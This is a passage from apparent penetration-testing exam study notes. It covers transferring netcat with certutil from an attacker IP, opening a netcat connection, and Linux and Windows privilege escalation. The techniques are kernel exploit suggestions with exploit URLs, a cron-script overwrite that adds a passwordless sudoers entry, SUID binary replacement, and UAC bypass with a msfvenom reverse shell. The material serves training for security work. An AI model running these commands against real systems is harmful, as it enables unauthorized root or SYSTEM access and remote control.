certutil -urlcache -f http://192.168.1.45/nc.exe nc.exe
```
[Certutil](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732443(v=ws.11)) exists by default on most versions of Windows

5. Test `nc.exe` in Windows:
```sh
nc.exe --help
```

##### Connecting 2 machines

Kali:
```sh
nc -nvlp 1234
```

Windows:
```sh
nc.exe -nv 192.168.1.45 1234 
```


## Privilege Escalation

To-do: Complete this section

### Linux PrivEsc

1. Linux Kernel Exploit (e.g.: Dirtycow)

Main idea: Running `linux-exploit-suggester` and find out possible vulnerabilities in the target system based on its kernel version

General idea:
- Download `linux-exploit-sggester` and make it executable:

```sh
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O linux-exploit-suggester.sh
```

```sh
chmod +x linux-exploit-suggester.sh
```

- Run it:

```sh
./linux-exploit-suggester.sh
```

A sample output of Linux Exploit Suggester:
```sh
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                                                                          
[+] [CVE-2022-2586] nft_object UAF                                                                                                                          

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: probable
   Tags: [ ubuntu=(20.04) ]{kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-0847] DirtyPipe

   Details: https://dirtypipe.cm4all.com/
   Exposure: probable
   Tags: [ ubuntu=(20.04|21.04) ],debian=11
   Download URL: https://haxx.in/files/dirtypipez.c

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: probable
   Tags: [ ubuntu=20.04 ]{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154


Vulnerable to CVE-2021-3560
```

Dirtycow: https://www.exploit-db.com/exploits/40839

2. Miconfigured CronJobs

- List available cronjobs:
```sh
crontab -l
```

- (Attempting to) modify the cronjob (e.g.: shellscript):
```sh
printf '#!/bin/bash\necho "<USER> ALL=NOPASSWD:ALL" >> /etc/sudoers' > <CRONJOB_SCRIPT>
```

Example: let's say the cronjob script is `/usr/local/share/script.sh`
```sh
printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/script.sh
```

3. Abusing SUID

Case-1: often used in exams
- List files (in a directory where there might be a file that we can take advantage of exists):
```sh
ls -la
```

- Check if there's SUID:
```sh
file <filename>
```

- Find if there's a binary called by the file:
```sh
strings <filename>
```

- If there's one, remove the binary:
```sh
rm <binary>
```

- Replace the binary with `/bin/bash` to invoke a shell:
```sh
cp /bin/bash <binary>
```

- Execute the file (not the binary):
```sh
./<filename>
```

Case-2: Find SUID files owned by root
```sh
find / -user root -perm /4000 2>/dev/null
```

Likely output:
```sh
/usr/lib/policykit-1/polkit-agent-helper-1
...
/usr/bin/chsh
/usr/bin/python
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/pkexe
...
/snap/core/8268/bin/umount
```


### Windows PrivEsc

1. Windows Kernel Exploit

- Running Windows-Exploit-Suggester

2. Bypassing UAC (e.g.: UACme)

Main idea: Using Akagi64.exe or Akagi32.exe

General idea:
- In tab 1, find an existing vulnerability to get a remote access to a target system (e.g. : BadBlue)
- Open a new tab (tab 2), then generate an Msfvenom payload (e.g. : windows/meterpreter/reverse_tcp) in .exe format. Let's say the name is `backup.exe`
- Go back to tab 1 and upload the Msfvenom payload (.exe) and Akagi64.exe in `C:\Temp` folder
- Jump into tab 2. Open msfconsole and use the `exploit/multi/handler` module to set up a listener
- Return to tab 1 and execute Akagi64.exe and the Msfvenom payload: `.\Akagi64.exe 23 backup.exe`
- You'll see a meterpreter shell in the listener in tab 2 with an elevated access (`NT AUTHORITY\SYSTEM`)


3. Access Token Impersonation

Main idea: Loading incognito plugin on Metasploit and impersonate `NT AUTHORITY\SYSTEM`'s token

General idea:
- Gain access to target system via Meterpreter
- Load incognito module
- List available tokens and impersonate `ATTACKDEFENSE\Administrator`'s token
- Grep `explorer.exe`'s pid and migrate to it
- List available tokens and impersonate `NT AUTHORITY\SYSTEM`'s token


## Resources

- [Web Application Attacks](https://www.netsecfocus.com/oscp/2021/05/06/The_Journey_to_Try_Harder-_TJnull-s_Preparation_Guide_for_PEN-200_PWK_OSCP_2.0.html#section-9-web-application-attacks)
- [Hacking the OSCP: Web Apps](https://securing.dev/posts/hacking-the-oscp-web-apps/)
- [GTFO Bins - Unix binaries to bypass local security restrictions](https://gtfobins.github.io/)
- [Shellter](https://www.shellterproject.com/homepage/)
- [INE Training Notes - syselement](https://blog.syselement.com/ine/courses/ejpt/ejpt-cheatsheet)
